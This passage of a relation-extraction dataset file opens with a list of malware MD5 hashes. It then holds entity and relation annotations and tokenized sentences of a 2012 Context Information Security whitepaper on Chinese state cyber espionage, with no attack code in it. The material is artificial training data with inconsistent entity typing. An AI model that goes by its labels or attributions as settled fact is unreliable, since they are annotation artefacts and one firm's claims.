"bdfb76d4dd25ee3b4d36172a3c3cd98e"], ["be7d72c4bb76831089176dd90188ad3e", "bf0ad3625fd7cd2c8a7ba3fa74bf1605", "bf35c5cb6763679914f267be25a54601", "c0c04f41a823cdb4055b109dbadddd18"], ["c1a8179ef14ae95d809179185bcc269f", "c1ab14ce4612256bfc93c7b97e5f8353", "c2b975caad371568904a04bbb9bf6e17", "c3053ece751f9c0b2595a6d9350f48cf", "c39183372160e75c7083a5c9eac68124", "c3bac79122923eac3f1fd48c5775465d", "c47fe9b7a3b72937adeb665432aeeff5", "c4a6b6cf35ebed6d46eb5728a6247448"], ["c524005b6f98f5428c228a9577e20f91", "c576be490ae4b095149114b34c96c6a9", "c5da1da605a6bfc4bf99721e6d665b8d", "c6e5277717d0aa2ecd96e9ca06b195d1", "c729c36ad0e32be7b23ad022ab8de27c", "c7a7c668d4e5c80605bac305799d6ff2"], ["c8a1c24bcd91ca21e89888e418153472", "cd5ecadb214f3697d3c77e42c80aff71"], ["d030c4df015cff67353065c0f7198058", "d0b9b5889b3bc49ce4c4f942eef7e39f", "d0d614ca7bf6745ad52910da8a672e1c", "d1568b36e55fae5eb1b7a2ae3b9294f3", "d1f641b6dd8861598af23557a7a52a3b", "d414ce56e89e1db9df28c3dd388a8249", "d415b7a5d328e32a0c383ce3889468af", "d4baba6857f3682eeb8ae6f83cc9a271", "d4f1188e75c55444a191649c4b4e1362", "d541a9cca5288876676aae2ab962997f", "d57379739354b204898149b456e732b3", "d68d241572a8ffdc8a2e481c96baacfb", "d837313adef94c3b173e0a9128896250"], ["d84ecca01839642a27d29f885b885ff1", "d8815fe64eb5321add412554908da28a", "d8ca81ee8327d8314121d1560800674c", "d8f21a32f7d33b1b6b5e948029410eb4", "db3d36f3f8386f993a89c9bba25cbeaa", "dd260e8a5462304621001dd3c12e4aa8", "ddedcf6f543104a3485406d66068e263", "dec5441851026a66a4ff0cfd008983c0", "df87fe27fcda6906ae248663e0c62861", "dfa055d94e59afa791b0f99ff82b54a6", "e0417547ba54b58bb2c8f795bca0345c", "e1833932053171da15c60e6c2fca708a", "e21c8e1c3e79d669f13f771dbbe0eb77", "e22632b517305aab6ba9691507d1d562"], ["e31912492ef1edae863b34a96d8c529e", "e38d44d1a226b9c1ca70a3e78beaf735", "e3ead43315bcc851656805922309744f"], ["e5d96aa540dd934aec72dcecafd366b8", "e5ea0c7a48967202f25fc96d91a1a2cb", "e61b128e97a39fe869cf89be571fe021"], ["e691dc42a002e9f48f69cd33b70d8a15", "e7f5a93eb76bab40d4aa088fba115aaf", "e7f93c894451ef1fdefa81c6b229852c", "e8664b135b6d681c812aa04ba14a120c", "e875d971524d45c10cf332ebf7256688", "eb0e2d5ebf6f3dbb4510b85c30a9751d", "eb1dc493f005059c654817d153f7ee74", "edbc569b5b5824a53721b71ad325a212", "edfcb5ec135c94b77e4b94c2a82863b7", "ee3ac02b6ca3d6c9012604d71017058f", "eebfa7677dedd10edf4aca985f16284c", "f03594793c06a097e4b1ac7e1d7079b8", "f09e2e3a57d336cb65acab2bdd6b9d14", "f1bb8a80e23b6c90004d97c7ef2d0454", "f2627bf17528011130e5818bfac0afdb", "f2a405326747245e5db97c60e878660b", "f34195a2317bf079844bc44c92297cae", "f36007400f0c85784fd374ad4ed23c6e", "f362f47eb844f889bafd5a0e92c7cdf0", "f3b95dad321a14500154e13cf3fbefe4", "f3d302a8c56ea86d429157fde1793210"], ["f50406b902601b005c1908a048489ca2"], ["f50fa07be0222baffff05b23fdfd5b68", "f5b65b971509eefa009d032003410faf", "f77aff1d1c0d94cc96828fb88f3280f3", "f7e3b90592c75a6c3c15336d34d97a9e", "f9e64eba7185c266786857d7f933577b", "fa3f412be4ebf45f478135221365dda7", "fa7641771280db462f088d8353dbcfbd", "fb11225f453365af4958f98bde2ce918", "fc5364e8274a2eb8310d2528d78ac07e", "fe4d6a3428cd9f87d5a7044d733d2299", "ff271c14549b133a4475ad6615e894da", "MD5", "signatures", "for", "RegSubDat"], ["01355596ec3596aa02b8c5f9f1adb5d6"], ["030d492c8d12434144f9b1dc97928cb8", "0434ae7b8267b08bd1c6ae17d6100353", "048a3815cbf0b8dc9b4c3f680fcd913f"], ["06054346974f309e1003faabac0d1dd5"], ["0836b4a02971aaef33905a91799063ed"], ["09e372c29e69e1edd29f02d4e660d33f"], ["0cafb41eca73d768091bc93f4343cbb9"], ["1050edb8cc0a073991bc637d590d89cc", "12954f97e5db1cc86ecfe12be2ec7323", "18f9d0973e60b13e7e28d0997e3a09e0"], ["237d641b8267867b007ec94e0bbeff1a", "2f6257eab8d3393ac6a96c490f1455ee"], ["351f1ee0cc65d004d40183a7fb6ce616"], ["36310e65b35780242d326f3f604b4c3f"], ["3da70425c099ad4c050eaa4c3308d0cf", "48c2d771e3083267a4f9e359ef0e53e5"], ["49b7bc9ac3800caa49bca0a4b3350dbd", "4ae7ac0060b938c50675ee2627e3c66d"], ["52856c1a0c63509bf6c00ef1e9fca03c", "58cde4ee026df987340a63cfc2c34318", "5d53c97b800ca1519800b872bc3f9edf"], ["5d88a3f713c610364fbf750f24af8257"], ["646abf38720c7301698c32bec62d84ce"], ["67d14ce17d3dab4a00d073b6315efc94"], ["69f8d66ccd7fc63ee3f8a3e4f7d86f07"], ["7019e8a17360a583931fb0908f31a2e2"], ["7f7bf881da34242dd1927fda745812f1", "81433a87eac3af2227623bf3239844de"], ["83976d6937ebf841999f10bee38ab252", "8b1c6478d620bfafbb2c5402d1f926c0", "91c3ec270cca27a3785ac827a336c050", "94d75acfc4c82c6e48e68b513ade057c", "992fa71f3b5e4b1ca3a43d5b2a69e1c0", "9a7f048e0e0d0f5bf117f19caef2db1f"], ["9aa7d5ede53be461ab8c4d68fcaa50ab"], ["9ec7da6881d2632a2e823176e915634b"], ["9ef570a298116ac810fdde31a64c7631"], ["a33ab32eeb02b677f9f2786dc3c0651c", "a3a1ea2c99d40620fc8dee0222228f24", "a876acf60d6e4c4da1123fc11f01ced7", "aa90c8e524edb644286c5c0f6c5de987", "af0aa267ced776b99a7d157294ac59ba"], ["afd476bbc24a7f20afb017f6869fda65", "b5b51dc06c3e9104fa59642952e69d49", "b6352cc6e269277960a8da7c5f0306cd", "c5860171f919761db9ee78ef3dac5ab4"], ["c6a8c1cdeff0745427aafc588db9c59f", "caf90ceece7242bb1147019daf14598f", "cc683fc365ec57eea4bc8e1f80a66413"], ["ce47cb6268087cf5c27d77259496989c"], ["cff8e4eb16d010bcc33ad19eb807bd27", "d408c2e627b3a895868bf16a3b228eac"], ["dcb3b9ea717603bf6f42e7ce61ea3728", "dd1e6b39afcba13b3df3eae13f26d888", "e2aa3ca52b8ea17c4bb80d294fec8ec5"], ["e78cc8790ff97eb13d448c15f3f3acae", "ea20365eb2142afb4ab9a124808cb8c6", "ecf15cce8bd4d6907d86ccff932b64af", "ef80d287bd10af3b1cab06d01795ae1a", "f5437d13428440412cbf5522adb25f8f"], ["f9d2fec1684529f580785dda5820b372"]]}, {"vertexSet": [[{"name": "Chinese government", "pos": [23, 25], "sent_id": 40, "type": "ThreatActor"}], [{"name": "China", "pos": [16, 17], "sent_id": 45, "type": "Country"}], [{"name": "zero day", "pos": [25, 27], "sent_id": 52, "type": "Exploit"}], [{"name": "economics", "pos": [21, 22], "sent_id": 59, "type": "FinancialInformation"}], [{"name": "trade and human rights", "pos": [23, 27], "sent_id": 59, "type": "Information"}], [{"name": "government departments", "pos": [3, 5], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "embassies", "pos": [6, 7], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "NGOs", "pos": [11, 12], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "UN", "pos": [20, 21], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "G20", "pos": [22, 23], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "World Bank", "pos": [24, 26], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "IMF", "pos": [27, 28], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "Centre for the Protection of National Infrastructure", "pos": [7, 14], "sent_id": 69, "type": "Organization"}], [{"name": "FBI", "pos": [8, 9], "sent_id": 70, "type": "Organization"}], [{"name": "anti-virus", "pos": [44, 47], "sent_id": 75, "type": "CourseOfAction"}], [{"name": "firewalls", "pos": [48, 49], "sent_id": 75, "type": "CourseOfAction"}], [{"name": "penetration testing", "pos": [30, 32], "sent_id": 76, "type": "CourseOfAction"}], [{"name": "Adobe PDF", "pos": [28, 30], "sent_id": 100, "type": "File"}], [{"name": "Microsoft Office document", "pos": [31, 34], "sent_id": 100, "type": "File"}], [{"name": "Internet Explorer", "pos": [14, 16], "sent_id": 102, "type": "Software"}], [{"name": "Firefox", "pos": [17, 18], "sent_id": 102, "type": "Software"}], [{"name": "China", "pos": [13, 14], "sent_id": 110, "type": "Attacker"}], [{"name": "Japan", "pos": [19, 20], "sent_id": 111, "type": "Country"}], [{"name": "Taiwan", "pos": [21, 22], "sent_id": 111, "type": "Country"}], [{"name": "Tibet", "pos": [30, 31], "sent_id": 111, "type": "Country"}], [{"name": "Mongolia", "pos": [32, 33], "sent_id": 111, "type": "Country"}], [{"name": "US", "pos": [52, 53], "sent_id": 111, "type": "Country"}], [{"name": "Russia", "pos": [54, 55], "sent_id": 111, "type": "Country"}], [{"name": "UK", "pos": [57, 58], "sent_id": 111, "type": "Country"}], [{"name": "Germany", "pos": [59, 60], "sent_id": 111, "type": "Country"}], [{"name": "France", "pos": [61, 62], "sent_id": 111, "type": "Country"}], [{"name": "India", "pos": [63, 64], "sent_id": 111, "type": "Country"}], [{"name": "China", "pos": [73, 74], "sent_id": 111, "type": "Attacker"}], [{"name": "Brazil", "pos": [75, 76], "sent_id": 111, "type": "Country"}], [{"name": "Iran", "pos": [77, 78], "sent_id": 111, "type": "Country"}], [{"name": "Australia", "pos": [79, 80], "sent_id": 111, "type": "Location"}], [{"name": "separatist Uighurs", "pos": [17, 19], "sent_id": 115, "type": "ExploitTargetObject"}], [{"name": "Tibetan separatists", "pos": [29, 31], "sent_id": 115, "type": "ExploitTargetObject"}], [{"name": "pro-democracy supporters", "pos": [32, 36], "sent_id": 115, "type": "ExploitTargetObject"}], [{"name": "supporters of an independent Taiwan", "pos": [37, 42], "sent_id": 115, "type": "ExploitTargetObject"}], [{"name": "Falun Gong", "pos": [48, 50], "sent_id": 115, "type": "ExploitTargetObject"}], [{"name": "China", "pos": [0, 1], "sent_id": 122, "type": "Attacker"}], [{"name": "passive email attacks", "pos": [16, 19], "sent_id": 123, "type": "Exploit"}], [{"name": "Aurora", "pos": [11, 12], "sent_id": 126, "type": "Campaign"}], [{"name": "Google", "pos": [16, 17], "sent_id": 126, "type": "Organization"}], [{"name": "Adobe", "pos": [18, 19], "sent_id": 126, "type": "Organization"}], [{"name": "Juniper", "pos": [20, 21], "sent_id": 126, "type": "Organization"}], [{"name": "Northrup Grumman", "pos": [22, 24], "sent_id": 126, "type": "Organization"}], [{"name": "Night Dragon", "pos": [32, 34], "sent_id": 126, "type": "Campaign"}], [{"name": "energy sector", "pos": [44, 46], "sent_id": 126, "type": "ExploitTargetObject"}], [{"name": "Shady RAT", "pos": [50, 52], "sent_id": 126, "type": "Campaign"}], [{"name": "steel industry", "pos": [58, 60], "sent_id": 126, "type": "ExploitTargetObject"}], [{"name": "heavy engineering", "pos": [61, 63], "sent_id": 126, "type": "ExploitTargetObject"}], [{"name": "construction", "pos": [64, 65], "sent_id": 126, "type": "ExploitTargetObject"}], [{"name": "communications companies", "pos": [66, 68], "sent_id": 126, "type": "ExploitTargetObject"}], [{"name": "RSA", "pos": [19, 20], "sent_id": 129, "type": "ExploitTargetObject"}], [{"name": "SecurID tokens", "pos": [31, 33], "sent_id": 129, "type": "AccountAuthenticationInformation"}], [{"name": "Lockheed Martin", "pos": [17, 19], "sent_id": 131, "type": "Organization"}], [{"name": "People\u2019s Liberation Army", "pos": [4, 8], "sent_id": 154, "type": "Attacker"}], [{"name": "Pentagon", "pos": [20, 21], "sent_id": 157, "type": "ExploitTargetObject"}], [{"name": "Stuxnet", "pos": [18, 19], "sent_id": 160, "type": "Malware"}], [{"name": "Five Poisons", "pos": [32, 34], "sent_id": 239, "type": "MalwareFamily"}], [{"name": "3PLA", "pos": [18, 19], "sent_id": 289, "type": "AttackerGroup"}], [{"name": "Commercial Aircraft Corporation of China", "pos": [26, 31], "sent_id": 331, "type": "Organization"}], [{"name": "COMAC", "pos": [0, 1], "sent_id": 332, "type": "Organization"}], [{"name": "Parker Aerospace", "pos": [2, 4], "sent_id": 339, "type": "Organization"}], [{"name": "General Electric", "pos": [5, 7], "sent_id": 339, "type": "Organization"}], [{"name": "Honeywell", "pos": [8, 9], "sent_id": 339, "type": "Organization"}], [{"name": "Goodrich", "pos": [10, 11], "sent_id": 339, "type": "Organization"}], [{"name": "designs for the body of the aircraft", "pos": [1, 8], "sent_id": 357, "type": "TechnologyInformation"}], [{"name": "aerodynamic information", "pos": [13, 15], "sent_id": 357, "type": "TechnologyInformation"}], [{"name": "engine designs", "pos": [2, 4], "sent_id": 358, "type": "TechnologyInformation"}]], "labels": [{"r": "P32", "h": 21, "t": 22, "evidence": [110, 111]}, {"r": "P32", "h": 21, "t": 23, "evidence": [110, 111]}, {"r": "P32", "h": 21, "t": 24, "evidence": [110, 111]}, {"r": "P32", "h": 21, "t": 25, "evidence": [110, 111]}, {"r": "P32", "h": 21, "t": 26, "evidence": [110, 111]}, {"r": "P32", "h": 21, "t": 27, "evidence": [110, 111]}, {"r": "P32", "h": 21, "t": 28, "evidence": [110, 111]}, {"r": "P32", "h": 32, "t": 29, "evidence": [111]}, {"r": "P32", "h": 32, "t": 30, "evidence": [111]}, {"r": "P32", "h": 32, "t": 31, "evidence": [111]}, {"r": "P32", "h": 32, "t": 35, "evidence": [111]}, {"r": "P32", "h": 32, "t": 33, "evidence": [111]}, {"r": "P32", "h": 32, "t": 34, "evidence": [111]}, {"r": "P23", "h": 41, "t": 42, "evidence": [122, 123]}, {"r": "P27", "h": 43, "t": 44, "evidence": [126]}, {"r": "P27", "h": 43, "t": 45, "evidence": [126]}, {"r": "P27", "h": 43, "t": 46, "evidence": [126]}, {"r": "P27", "h": 43, "t": 47, "evidence": [126]}, {"r": "P27", "h": 48, "t": 49, "evidence": [126]}, {"r": "P27", "h": 50, "t": 51, "evidence": [126]}, {"r": "P27", "h": 50, "t": 52, "evidence": [126]}, {"r": "P27", "h": 50, "t": 53, "evidence": [126]}, {"r": "P27", "h": 50, "t": 54, "evidence": [126]}], "title": "201203ContextInformationSecurityCrouchingTiger", "sents": [["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Context", "Information", "Security"], ["whitepapers@contextis.com"], ["March", "2012", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "1", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Contents", "Executive", "Summary", "3", "Introduction", "4"], ["Categorising", "Attacks", "5", "Why", "Cyber", "?"], ["6", "How", "Cyber", "?"], ["7"], ["The", "Targets", "7", "The", "Requirements", "9", "Boosting", "Domestic", "Enterprise", "11"], ["At", "Risk", "12", "How", "Does", "it", "Happen", "?"], ["14", "Setting", "Requirements", "14", "Planning", "and", "Direction"], ["15", "Collection", "15", "Processing", "and", "Exploitation", "15", "Analysis", "and", "Production", "15", "Dissemination", "16"], ["The", "Scale", "of", "the", "Operation", "17"], ["Profiting", "from", "the", "Product", "18", "Hypothetical", "Case", "Study", ":"], ["Aircraft", "Construction", "19", "Conclusion", "21", "About", "Context", "23", "Appendix", "24", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "2", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Executive", "Summary", "Media", "reports", "show", "that", "targeted", "cyber", "attacks", "against", "government", "and", "commerce", "have", "been", "ongoing", "since", "at", "least", "2003", "and", "possibly", "some", "time", "before", "that", "."], ["By", "far", "the", "largest", "sponsor", "of", "these", "attacks", "is", "the", "Chinese", "state", "."], ["This", "is", "not", "a", "new", "problem", ";", "it", "is", "espionage", "with", "a", "different", "methodology", "."], ["These", "attacks", "are", "far", "from", "random", "or", "indiscriminate", "."], ["These", "attacks", "are", "designed", "to", "steal", "information", "that", "will", "fulfil", "a", "clear", "set", "of", "requirements", "set", "by", "the", "Chinese", "state", "and", "furnish", "them", "with", "political", ",", "commercial", "and", "security", "/", "intelligence", "information", "."], ["These", "requirements", "are", "carefully", "and", "clearly", "identified", ",", "shared", "with", "a", "number", "of", "government", "departments", "and", "constantly", "updated", "."], ["There", "is", "evidence", "of", "worldwide", "targeting", "but", "only", "a", "minority", "of", "attacks", "are", "identified", "and", "fewer", "still", "made", "public", "."], ["This", "is", "a", "structured", "program", "and", "the", "main", "protagonists", "in", "China", "are", "widely", "believed", "to", "be", "the", "Third", "Department", "of", "the", "People", "\u2019s", "Liberation", "Army", "."], ["Even", "using", "conservative", "estimates", "it", "is", "likely", "that", "the", "program", "employs", "thousands", "of", "military", "personnel", "."], ["While", "the", "military", "program", "may", "be", "the", "most", "developed", "and", "sophisticated", ",", "it", "is", "likely", "that", "other", "parts", "of", "the", "Chinese", "state", "and", "even", "the", "private", "sector", "may", "also", "be", "carrying", "out", "similar", "attacks", "."], ["There", "are", "clues", "to", "the", "companies", "and", "types", "of", "data", "most", "at", "risk", "."], ["In", "particular", "the", "Five", "Year", "Plan1", "and", "the", "National", "Outline", "for", "Medium", "and", "Long", "Term", "S&T", "Development2", "give", "detail", "on", "the", "areas", "in", "which", "China", "intends", "to", "excel", "and", "identifies", "specific", "technology", "which", "the", "Chinese", "want", "to", "develop", "or", "otherwise", "acquire", "."], ["Electronics", ",", "telecoms", ",", "manufacturing", ",", "extraction", ",", "energy", ",", "biotech", ",", "pharmaceuticals", ",", "aerospace", ",", "space", "and", "defence", "are", "sectors", "at", "the", "highest", "risk", ",", "alongside", "companies", "and", "services", "such", "as", "law", "and", "accountancy", "firms", "that", "support", "them", "and", "hold", "their", "data", "."], ["The", "likely", "recipients", "of", "stolen", "commercial", "data", "are", "the", "117", "Chinese", "State", "Owned", "Enterprises", "that", "dominate", "the", "economy", "."], ["These", "companies", "are", "closely", "linked", "to", "the", "state", "and", "the", "Communist", "Party", "which", "has", "power", "over", "strategy", ",", "senior", "management", "and", "even", "wages", "."], ["Companies", "with", "SOE", "competitors", "should", "be", "especially", "concerned", "about", "data", "security", "."], ["Two", "factors", "make", "western", "governments", "and", "companies", "more", "vulnerable", "to", "Chinese", "targeted", "cyber", "attacks", "."], ["Firstly", ",", "there", "is", "reluctance", "for", "governments", "and", "companies", "to", "accuse", "China", "directly", "or", "take", "any", "form", "of", "action", "for", "fear", "of", "either", "being", "isolated", "politically", "or", "being", "blocked", "from", "a", "lucrative", "developing", "market", "."], ["Secondly", ",", "a", "long", "term", "reliance", "on", "traditional", "security", "products", "such", "as", "anti", "-", "virus", ",", "coupled", "with", "a", "lack", "of", "education", "about", "the", "threat", ",", "leaves", "businesses", "vulnerable", "to", "attack", "and", "unprepared", "for", "any", "investigations", "that", "are", "required", "in", "the", "aftermath", "of", "a", "compromise", "."], ["Context", "has", "extensive", "experience", "of", "detecting", "and", "investigating", "targeted", "attacks", "and", "working", "with", "clients", "to", "help", "protect", "their", "data", "."], ["1", "Chinese", "Government", "Official", "Web", "Portal", "website", "2", "China", "International", "Science", "and", "Technology", "Cooperation", "website", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "3", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Introduction"], ["There", "have", "been", "many", "media", "reports", "in", "recent", "years", "about", "cyber", "attacks", "on", "governments", "and", "a", "variety", "of", "private", "sector", "companies", "."], ["The", "rather", "ambiguous", "term", "\u2018", "Advanced", "Persistent", "Threat\u20193", "(", "\u2018", "APT", "\u2019", ")", "is", "widely", "used", "to", "describe", "any", "attack", "that", "appears", "to", "have", "compromised", "computers", "in", "these", "companies", "or", "organisations", ",", "regardless", "of", "the", "source", "or", "purpose", "of", "the", "attack", "."], ["We", "prefer", "simply", "to", "call", "them", "\u2018", "targeted", "attacks", "\u2019", "and", "leave", "marketing", "terms", "to", "one", "side", "."], ["This", "paper", "is", "not", "concerned", "with", "the", "technical", "aspects", "of", "targeted", "attacks", ",", "it", "seeks", "instead", "to", "inform", "readers", "about", "the", "full", "scope", "and", "nature", "of", "these", "attacks", ",", "the", "reasons", "why", "they", "are", "launched", "and", "the", "people", "and", "policies", "behind", "their", "design", "and", "execution", "."], ["Many", "reports", "of", "attacks", "inevitably", "end", "by", "asking", "\u2018", "who", "did", "it", "?", "\u2019"], ["But", "the", "answer", "is", "rarely", "straightforward", "."], ["Western", "Governments", "usually", "allege", "the", "attacks", "come", "from", "\u2018", "Asia", "\u2019", "or", "the", "\u2018", "Far", "East", "\u2019", ",", "rather", "than", "risk", "offending", "the", "Chinese", "government", "."], ["Large", "corporations", "are", "similarly", "vague", "in", "their", "descriptions", "of", "these", "events", ",", "for", "fear", "of", "harming", "lucrative", "business", "arrangements", "."], ["Security", "\u2018", "experts", "\u2019", "always", "caution", "that", "IP", "addresses", "can", "be", "used", "as", "hop", "points", "through", "which", "attackers", "disguise", "their", "true", "origins", ",", "so", "perhaps", "this", "could", "be", "a", "case", "of", "other", "countries", "trying", "to", "make", "it", "look", "as", "if", "China", "was", "the", "source", "."], ["While", "this", "is", "true", ",", "if", "something", "looks", ",", "walks", "and", "quacks", "like", "a", "duck", ",", "it", "is", "almost", "always", "a", "duck", "."], ["We", "will", "not", "be", "so", "coy", "."], ["This", "paper", "will", "look", "directly", "at", "the", "most", "prolific", "sponsor", "of", "computer", "network", "exploitation", "attacks", ":", "China", "."], ["We", "know", "other", "countries", "have", "implemented", "similar", "programs", "for", "attacking", "computer", "networks", "and", "have", "seen", "many", "examples", "of", "these", "in", "our", "work", "over", "the", "last", "few", "years", ",", "but", "our", "focus", "here", "is", "China", "."], ["We", "will", "examine", "various", "aspects", "of", "these", "attacks", ",", "including", "the", "nature", "of", "the", "information", "targeted", "and", "the", "types", "of", "organisations", "threatened", "."], ["We", "will", "consider", "the", "effort", "involved", "in", "planning", ",", "executing", "and", "managing", "these", "attacks", ";", "and", "assess", "the", "information", "products", "they", "generate", ",", "in", "order", "to", "understand", "the", "scale", "of", "human", "involvement", "and", "the", "government", "policies", "that", "sponsor", "information", "theft", "via", "targeted", "attacks", "."], ["With", "all", "this", "in", "mind", "we", "will", "then", "postulate", "on", "where", "the", "stolen", "information", "goes", "and", "how", "it", "may", "be", "used", "."], ["Advanced", "Persistent", "Threat", "has", "recently", "become", "a", "catch", "all", "term", "for", "targeted", "attacks", "against", "computer", "networks", "and", "is", "often", "used", "to", "describe", "the", "malware", "."], ["In", "fact", ",", "the", "term", "was", "first", "coined", "by", "the", "United", "States", "Air", "Force", "in", "2006", ",", "specifically", "to", "refer", "to", "China", "\u2013", "without", "actually", "saying", "China", "."], ["\u2018", "Advanced", "\u2019", "because", "the", "attackers", "could", "use", "a", "variety", "of", "attacks", "to", "get", "access", "to", "a", "network", "and", "could", "raise", "their", "game", "to", "use", "zero", "day", "vulnerabilities"], ["if", "necessary", ";", "\u2018", "Persistent", "\u2019", "because", "the", "attacks", "would", "not", "stop", "until", "the", "attacker", "had", "achieved", "their", "objectives", ";", "and", "\u2018", "Threat", "\u2019", "because", "this", "attack", "was", "not", "automated", "like", "a", "botnet", ",", "but", "was", "conducted", "by", "humans", "who", "adapt", "and", "evolve", "their", "methods", "to", "evade", "defences", "."], ["3", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "4", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Categorising", "Attacks"], ["Many", "commentators", "have", "divided", "the", "targets", "of", "attacks", "into", "four", "categories", ":", "political", ",", "economic", ",", "technical", "and", "military", "."], ["This", "works", "as", "a", "general", "model", ",", "but", "focuses", "on", "the", "target", "of", "the", "attack", "as", "a", "whole", "rather", "than", "considering", "the", "type", "of", "information", "the", "attacker", "seeks", "to", "steal", "."], ["If", "a", "criminal", "gang", "unleashes", "a", "phishing", "attack", "aimed", "at", "harvesting", "banking", "credentials", "and", "it", "is", "the", "employees", "of", "a", "butchers", "shop", "and", "a", "bakery", "that", "fall", "victim", "to", "it", ",", "that", "does", "not", "mean", "the", "attack", "was", "targeting", "bread", "and", "meat", "."], ["Bearing", "this", "in", "mind", ",", "we", "divide", "target", "areas", "into", "the", "following", "categories", ":", "Political", "."], ["The", "information", "targeted", "will", "inform", "the", "state", "on", "the", "political", "positions", "of", "other", "governments", "on", "a", "range", "of", "issues", ",", "including", "economics", ",", "trade", "and", "human", "rights", "."], ["Typical", "targets", "are", "government", "departments", ",", "embassies", ",", "trade", "bodies", ",", "NGOs", ",", "and", "international", "political", "groups", "such", "as", "the", "UN", ",", "G20", ",", "World", "Bank", "and", "IMF", "."], ["Commercial", "."], ["The", "information", "targeted", "will", "be", "of", "value", "to", "the", "private", "sector", "within", "that", "country", "(", "even", "if", "the", "lines", "between", "private", "and", "public", "sectors", "are", "blurred", ")", "."], ["It", "may", "include", "IPR", ",", "product", "designs", ",", "negotiating", "positions", "for", "sales", "discussions", ",", "mergers", "and", "acquisitions", "information", "and", "strategic", "plans", "(", "particularly", "in", "relation", "to", "the", "attacking", "country", ")", "."], ["Intelligence", "."], ["The", "information", "targeted", "here", "will", "be", "used", "to", "safeguard", "internal", "security", "by", "the", "attacker", "country", "(", "this", "may", "entail", "intimidation", "or", "close", "monitoring", "of", "minority", "or", "opposition", "groups", "or", "individuals", ")", "and", "to", "enable", "analysis", "of", "the", "military", "technology", ",", "capabilities", "and", "intentions", "of", "other", "countries", "."], ["There", "are", "a", "number", "of", "major", "problems", "that", "need", "to", "be", "overcome", "when", "seeking", "a", "complete", "understanding", "of", "the", "scale", "and", "purpose", "of", "attacks", "."], ["Many", "will", "never", "be", "detected", ",", "those", "that", "are", "may", "not", "always", "be", "reported", ";", "and", "the", "vast", "majority", "are", "not", "investigated", "by", "professionals", "with", "a", "good", "understanding", "of", "these", "types", "of", "attack", "."], ["Dealing", "with", "the", "technical", "aspects", "of", "the", "compromise", "alone", "is", "not", "enough", ":", "the", "victim", "needs", "to", "know", "why", "they", "were", "being", "attacked", ",", "by", "whom", ",", "what", "data", "was", "stolen", "and", "where", "it", "may", "go", "."], ["While", "government", "agencies", ",", "such", "as", "the", "Centre", "for", "the", "Protection", "of", "National", "Infrastructure4"], ["(", "CPNI", ")", "in", "the", "UK", "and", "the", "FBI5", "in", "the", "US", ",", "are", "working", "successfully", "with", "larger", "organisations", "to", "identify", "potential", "threats", ",", "reduce", "the", "risk", "of", "successful", "attacks", "and", "in", "some", "cases", "to", "identify", "and", "investigate", "specific", "compromises", ",", "this", "assistance", "is", "not", "available", "to", "every", "company", "."], ["It", "is", "not", "generally", "available", "to", "those", "that", "need", "it", "the", "most", "\u2013", "companies", "that", "innovate", "and", "excel", "in", "niche", "areas", "and", "supply", "technology", "or", "products", "that", "other", "companies", "make", "use", "of", "in", "larger", "projects", "."], ["These", "companies", "live", "and", "die", "by", "the", "success", "of", "their", "research", "and", "development", ",", "but", "often", "lack", "the", "budgetary", "resources", "or", "expertise", "required", "to", "adequately", "protect", "their", "networks", "from", "this", "type", "of", "threat", "."], ["Even", "when", "compromises", "are", "investigated", "by", "companies", "that", "understand", "the", "attackers", "and", "their", "motives", ",", "it", "is", "often", "not", "felt", "to", "be", "in", "the", "interests", "of", "either", "party", "to", "publish", "the", "findings", "of", "those", "investigations", ",", "or", "to", "share", "the", "results", "with", "the", "affected", "company", "\u2019s", "competitors", ",", "who", "4", "http://www.cpni.gov.uk", "5", "http://www.fbi.gov/", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ","], ["E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "5", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "may", "be", "suffering", "from", "similar", "attacks", "."], ["There", "is", "also", "a", "widespread", "lack", "of", "understanding", "of", "targeted", "attacks", "among", "IT", "staff", ",", "a", "lack", "of", "dedicated", "IT", "security", "personnel", "and", ",", "sometimes", "as", "a", "consequence", "of", "IT", "functions", "being", "outsourced", ",", "an", "over", "-", "reliance", "on", "traditional", "security", "products", "such", "as", "anti", "-", "virus", "and", "firewalls", "\u2013", "both", "of", "which", "are", "ineffective", "against", "even", "lower", "end", "targeted", "attacks", "."], ["The", "pressure", "exerted", "on", "IT", "staff", "from", "the", "business", "is", "primarily", "concerned", "with", "service", "uptime", "and", "availability", "rather", "than", "security", ";", "and", "budgets", "for", "even", "routine", "security", "operations", "such", "as", "penetration", "testing", "are", "under", "constant", "pressure", "."], ["It", "is", "a", "sad", "fact", "that", ",", "for", "many", "businesses", ",", "money", "for", "IT", "security", "only", "becomes", "available", "once", "a", "serious", "problem", "has", "been", "identified", ",", "by", "which", "time", "it", "is", "often", "too", "late", "."], ["One", "more", "common", "problem", "in", "private", "sector", "companies", "is", "that", "some", "managers", 